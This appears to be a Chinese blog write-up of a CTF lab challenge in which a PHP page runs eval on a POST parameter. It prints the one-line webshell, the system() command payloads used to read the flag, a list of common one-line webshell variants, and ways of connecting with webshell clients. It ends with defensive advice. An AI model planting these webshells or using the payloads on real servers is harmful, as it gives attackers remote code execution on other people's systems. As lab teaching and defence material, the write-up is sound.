@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web安全 · 一句话木马（eval webshell）WriteUp —「白给的shell」 · pressure-J</title>
+<meta name="description" content="一行，完完整整的一句话木马。 没有过滤、没有鉴权、没有长度限制。">
+<meta name="author" content="pressure-J">
+<meta name="color-scheme" content="dark light">
+<link rel="canonical" href="https://pressure-j.github.io/posts/web-an-quan-yi-ju-hua-mu-ma-eval-webshell-writeup-bai-gei-de-shell.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Web安全 · 一句话木马（eval webshell）WriteUp —「白给的shell」 · pressure-J">
+<meta property="og:description" content="一行，完完整整的一句话木马。 没有过滤、没有鉴权、没有长度限制。">
+<meta property="og:site_name" content="pressure-J">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/rss+xml" title="pressure-J" href="../rss.xml">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/highlight.css">
+<script>
+(function() {
+  try {
+    var t = localStorage.getItem('theme');
+    if (!t) t = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+  } catch (e) {}
+})();
+</script>
+</head>
+<body class="has-toc">
+<div class="progress-bar" id="progress"></div>
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html">
+      <span class="brand-mark">$</span><span class="brand-name">pressure-J</span><span class="brand-caret">_</span>
+    </a>
+    <nav class="site-nav" id="site-nav"><a href="../index.html">首页</a><a href="../posts.html" class="on">文章</a><a href="../category/index.html">分类</a><a href="../about.html">关于</a></nav>
+    <div class="header-tools">
+      <a class="icon-btn" href="../posts.html#search" aria-label="搜索">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </a>
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换主题">
+        <svg class="i-sun" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4.4"/><path d="M12 2.2v2.2M12 19.6v2.2M2.2 12h2.2M19.6 12h2.2M4.9 4.9l1.6 1.6M17.5 17.5l1.6 1.6M19.1 4.9l-1.6 1.6M6.5 17.5l-1.6 1.6"/></svg>
+        <svg class="i-moon" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><path d="M21 12.9A8.6 8.6 0 1 1 11.1 3a6.6 6.6 0 0 0 9.9 9.9z"/></svg>
+      </button>
+      <button class="icon-btn menu-btn" id="menu-btn" type="button" aria-label="菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+<main class="wrap post-layout">
+  <div class="post-main">
+    <nav class="breadcrumb">
+      <a href="../index.html">首页</a><span>/</span>
+      <a href="../category/web.html">Web 安全</a>
+    </nav>
+    <article class="post">
+      <header class="post-header">
+        <h1>Web安全 · 一句话木马（eval webshell）WriteUp —「白给的shell」</h1>
+        <div class="post-meta">
+          <span class="cat-badge cat-web">Web 安全</span>
+          <time datetime="2026-10-05">2026-10-05</time>
+          <span>3465 字</span>
+          <span>约 9 分钟</span>
+        </div>
+        
+      </header>
+      <div class="content"><blockquote>
+<p>目标：<code>http://ee4b5a566ba3b058c0e2c5f5.http-ctf2.dasctf.com/</code><br />
+环境：PHP 5.5.9（Ubuntu），openresty 前端<br />
+考点：<code>eval()</code> 型一句话木马原理与利用<br />
+flag：<code>CTF2{3bcbd9ef-a038-4ddd-9558-b3bcdd73069d}</code></p>
+</blockquote>
+<hr />
+<h2 id="_1">一、页面信息</h2>
+<p>访问首页，页面直接写着：</p>
+<div class="code-block" data-lang="html"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>我家菜刀丢了，你能帮我找一下么<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>eval($_POST["Syc"]);<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</code></pre></div></div>
+
+<p>"菜刀"指<strong>中国菜刀</strong>（China Chopper）——国内早期最流行的 webshell 管理客户端。这题的题干直接把 <code>eval($_POST["Syc"]);</code> 摆出来，等于<strong>白送一个 webshell</strong>（标题"白给的shell"）。</p>
+<hr />
+<h2 id="_2">二、源码确认</h2>
+<p>用这个 shell 自己读 <code>index.php</code>（<code>POST: Syc=system("cat index.php");</code>）：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"Syc"</span><span class="p">]);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><strong>一行，完完整整的一句话木马。</strong> 没有过滤、没有鉴权、没有长度限制。</p>
+<hr />
+<h2 id="_3">三、利用过程</h2>
+<p>既然服务端会 <code>eval($_POST["Syc"])</code>，那么 POST 的 <code>Syc</code> 参数内容会被当成 <strong>PHP 代码直接执行</strong>。</p>
+<div class="code-block" data-lang="php"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="c1"># 1. 确认执行权限</span>
+POST<span class="w"> </span><span class="nv">Syc</span><span class="o">=</span>system<span class="o">(</span><span class="s2">"id"</span><span class="o">)</span><span class="p">;</span>
+→<span class="w"> </span><span class="nv">uid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span>
+
+<span class="c1"># 2. 看目录</span>
+POST<span class="w"> </span><span class="nv">Syc</span><span class="o">=</span>system<span class="o">(</span><span class="s2">"ls -la"</span><span class="o">)</span><span class="p">;</span>
+→<span class="w"> </span>index.php<span class="w">       </span>（当前目录没有<span class="w"> </span>flag）
+
+<span class="c1"># 3. 看根目录</span>
+POST<span class="w"> </span><span class="nv">Syc</span><span class="o">=</span>system<span class="o">(</span><span class="s2">"ls -la /"</span><span class="o">)</span><span class="p">;</span>
+→<span class="w"> </span>-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">43</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="m">07</span>:40<span class="w"> </span>flag<span class="w">     </span>←<span class="w"> </span>找到了
+
+<span class="c1"># 4. 读 flag</span>
+POST<span class="w"> </span><span class="nv">Syc</span><span class="o">=</span>system<span class="o">(</span><span class="s2">"cat /flag"</span><span class="o">)</span><span class="p">;</span>
+→<span class="w"> </span>CTF2<span class="o">{</span>3bcbd9ef-a038-4ddd-9558-b3bcdd73069d<span class="o">}</span>
+</code></pre></div></div>
+
+<p><strong>注意 <code>flag</code> 在 <code>/</code> 根目录、权限 <code>-rw-r--r--</code>（所有人可读）</strong>，所以 <code>www-data</code> 直接就能读，不需要提权。</p>
+<hr />
+<h2 id="eval">四、<code>eval()</code> 一句话木马原理</h2>
+<h3 id="1-eval-system">1. <code>eval</code> 和 <code>system</code> 是两个层次的东西</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>执行的东西</th>
+<th>语言层</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>system()</code> / <code>exec()</code> / <code>shell_exec()</code></td>
+<td><strong>操作系统命令</strong>（ls、cat）</td>
+<td>shell</td>
+</tr>
+<tr>
+<td><code>eval()</code></td>
+<td><strong>PHP 代码</strong>（<code>phpinfo();</code>）</td>
+<td>PHP</td>
+</tr>
+</tbody>
+</table></div>
+<p><code>eval($_POST["Syc"])</code> 把用户输入当 <strong>PHP 代码</strong>执行。所以传 <code>system("id");</code> 时，实际执行链是：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>POST Syc=system("id");
+   ↓
+eval('system("id");')        ← PHP 代码层
+   ↓
+system("id") 被执行
+   ↓
+调用 shell 执行 id 命令       ← 系统命令层
+</code></pre></div></div>
+
+<p>也就是说：<strong>eval 是入口，再用 <code>system()</code>/<code>shell_exec()</code> 打通到系统命令层</strong>。只传 <code>system("id");</code> 这一串，就完成了"PHP 代码 → 系统命令"的穿透，这也是"一句话木马"得名的原因——<strong>一个 eval 就够控制整台服务器</strong>。</p>
+<h3 id="2-_post-_get">2. 为什么用 <code>$_POST</code> 而不是 <code>$_GET</code></h3>
+<p><code>eval($_GET["Syc"])</code> 也能用，但 <code>$_POST</code> 更适合当木马：<br />
+- <strong>不受 URL 长度限制</strong>，能传大段 payload<br />
+- payload 不出现在访问日志的 URL 里（隐蔽）<br />
+- 能传二进制/复杂内容</p>
+<h3 id="3">3. 常见的一句话木马写法（对比记忆）</h3>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">                 // eval 系（本题）</span>
+<span class="cp">&lt;?php</span> <span class="nb">assert</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">               // assert 系（PHP 7.2 后废弃）</span>
+<span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">                // @ 抑制报错，更隐蔽</span>
+<span class="cp">&lt;?php</span> <span class="nv">$a</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'a'</span><span class="p">];</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">         // 变量中转</span>
+<span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">             // GET/POST 通吃</span>
+<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">               // 直接命令执行，不经过 eval</span>
+<span class="cp">&lt;?php</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'b'</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">           // 动态函数：?a=system</span>
+<span class="cp">&lt;?php</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/e'</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'a'</span><span class="p">],</span> <span class="s1">''</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"> // /e 修饰符（已废弃）</span>
+</code></pre></div></div>
+
+<hr />
+<h2 id="_4">五、连接方式（"菜刀丢了"怎么找回来）</h2>
+<p>题干说"菜刀丢了"，意思是<strong>用 webshell 客户端去连</strong>。几种方式：</p>
+<h3 id="1">① 浏览器手工发（无需工具，最直观）</h3>
+<p><strong>F12 → Network / Console</strong>，或直接构造 POST 请求：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">ee4b5a566ba3b058c0e2c5f5.http-ctf2.dasctf.com</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">...</span>
+
+<span class="nt">Syc</span><span class="o">=</span><span class="s">system("cat /flag");</span>
+</code></pre></div></div>
+
+<p>在浏览器里有两种做法：<br />
+1. <strong>Console</strong> 里用 <code>fetch</code>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="nx">fetch</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="nx">method</span><span class="o">:</span><span class="s1">'POST'</span><span class="p">,</span><span class="w"> </span><span class="nx">headers</span><span class="o">:</span><span class="p">{</span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="s1">'application/x-www-form-urlencoded'</span><span class="p">},</span>
+<span class="w">            </span><span class="nx">body</span><span class="o">:</span><span class="s1">'Syc='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="s1">'system("cat /flag");'</span><span class="p">)})</span>
+<span class="w">  </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">t</span><span class="p">=&gt;</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">t</span><span class="p">));</span>
+</code></pre></div></div>
+
+<ol start="2">
+<li>页面里自己建一个 form 提交，或装一个插件（如 HackBar）填 POST body。</li>
+</ol>
+<h3 id="2-antsword">② 蚁剑（AntSword，本机已装）</h3>
+<p>新建数据 → URL 填目标地址 → <strong>请求体</strong>（或参数名）填 <code>Syc</code> → 密码即参数名。<br />
+蚁剑会自动注入它自己的 payload（默认也是一段 <code>eval</code> 风格代码），把文件管理、虚拟终端、数据库等功能可视化。</p>
+<h3 id="3-burp-suite">③ Burp Suite</h3>
+<p>拦截首页请求 → 改成 POST → body 填 <code>Syc=...</code> → 反复用 Repeater 改 payload。</p>
+<blockquote>
+<p><strong>原理一句话</strong>：webshell 客户端做的事，本质就是"往这个 POST 参数里塞 PHP 代码，然后把回显解析成图形界面"。因此只要能手工发 POST，就不需要客户端也能打。</p>
+</blockquote>
+<hr />
+<h2 id="_5">六、知识点沉淀</h2>
+<ol>
+<li><strong>一句话木马的本质</strong>：把用户可控输入送进 <code>eval()</code>/<code>assert()</code>/<code>system()</code>，即"用户输入 = 可执行代码"。这是代码注入（Code Injection）最直接的形态。</li>
+<li><strong><code>eval</code> 是 PHP 代码层，<code>system</code> 是系统命令层</strong>；一句话木马用 eval 当入口，再靠 <code>system()</code>/<code>shell_exec()</code> 穿透到 OS 层。</li>
+<li><strong><code>$_POST</code> 优于 <code>$_GET</code></strong>：长度不受限、不进 URL 日志、便于传复杂 payload。</li>
+<li><strong>flag 不总在 web 目录</strong>。本题当前目录只有 <code>index.php</code>，flag 在 <code>/flag</code>（根目录，全局可读）。拿到 RCE 后标准的排查动作是：<code>ls -la</code> 当前目录 → <code>ls -la /</code> → <code>find / -name '*flag*' 2&gt;/dev/null</code>。</li>
+<li><strong>防御视角</strong>：<br />
+   - 绝对禁止把用户输入传给 <code>eval</code>/<code>assert</code>/<code>create_function</code>/<code>preg_replace(/e)</code><br />
+   - 上传目录禁止 PHP 执行（nginx <code>location ~ \.php$ { deny all; }</code> 或独立静态目录）<br />
+   - 文件内容做特征检测（<code>eval($_POST</code>、<code>assert(</code> 等），WAF 可拦一句话木马<br />
+   - 最小权限运行 web 用户，限制其可读文件范围（本题 <code>www-data</code> 能直接读 <code>/flag</code> 就是权限配置问题）</li>
+<li><strong>CTF 提示语的语义</strong>："白给的shell"= 无需绕过直接给你 RCE；"菜刀丢了"= 提示用 webshell 客户端（菜刀/蚁剑）连接，但手工 POST 同样可行。</li>
+</ol></div>
+      <div class="post-nav"><a class="pn-item prev" href="web-an-quan-unicorn-shop-dan-zi-fu-shu-zi-jie-xi-writeup-dasctf-huan.html"><span>← 上一篇</span><strong>Web安全 · Unicorn Shop「单字符 &amp;&amp; 数字解析」WriteUp（DASCTF 环境）</strong></a><a class="pn-item next" href="web-an-quan-ping-ming-ling-zhu-ru-guo-lv-rao-guo-writeup-dasctf-huan.html"><span>下一篇 →</span><strong>Web安全 · Ping 命令注入过滤绕过 WriteUp（DASCTF 环境）</strong></a></div>
+      <div class="post-end">
+        <a href="../posts.html">← 返回文章列表</a>
+        <a href="https://github.com/pressure-J" target="_blank" rel="noopener">在 GitHub 上找我</a>
+      </div>
+    </article>
+  </div>
+  <aside class="toc" id="toc">
+  <div class="toc-title">目录</div>
+  <nav><a href="#_1" class="toc-lv2">一、页面信息</a><a href="#_2" class="toc-lv2">二、源码确认</a><a href="#_3" class="toc-lv2">三、利用过程</a><a href="#eval" class="toc-lv2">四、eval() 一句话木马原理</a><a href="#1-eval-system" class="toc-lv3">1. eval 和 system 是两个层次的东西</a><a href="#2-_post-_get" class="toc-lv3">2. 为什么用 $_POST 而不是 $_GET</a><a href="#3" class="toc-lv3">3. 常见的一句话木马写法（对比记忆）</a><a href="#_4" class="toc-lv2">五、连接方式（&quot;菜刀丢了&quot;怎么找回来）</a><a href="#1" class="toc-lv3">① 浏览器手工发（无需工具，最直观）</a><a href="#2-antsword" class="toc-lv3">② 蚁剑（AntSword，本机已装）</a><a href="#3-burp-suite" class="toc-lv3">③ Burp Suite</a><a href="#_5" class="toc-lv2">六、知识点沉淀</a></nav>
+</aside>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <div class="footer-col footer-about">
+      <div class="footer-brand">pressure-J<span class="brand-caret">_</span></div>
+      <p>网络安全 · 应急响应 · 流量分析<br>写能复现、能讲清楚的东西。</p>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">导航</div>
+      <a href="../index.html">首页</a>
+      <a href="../posts.html">全部文章</a>
+      <a href="../category/index.html">分类</a>
+      <a href="../about.html">关于</a>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">在别处</div>
+      <a href="https://github.com/pressure-J" target="_blank" rel="noopener">GitHub</a>
+      <a href="mailto:1489955298@qq.com">Email</a>
+      <a href="../rss.xml">RSS</a>
+    </div>
+  </div>
+  <div class="wrap footer-bottom">
+    <span>© 2026 pressure-J</span>
+    <span class="footer-build">Build 2026-10-19 · Python + Markdown</span>
+  </div>
+</footer>
+<button class="to-top" id="to-top" type="button" aria-label="回到顶部">
+  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+</button>
+<script src="../assets/app.js" defer></script>
+</body>
+</html>
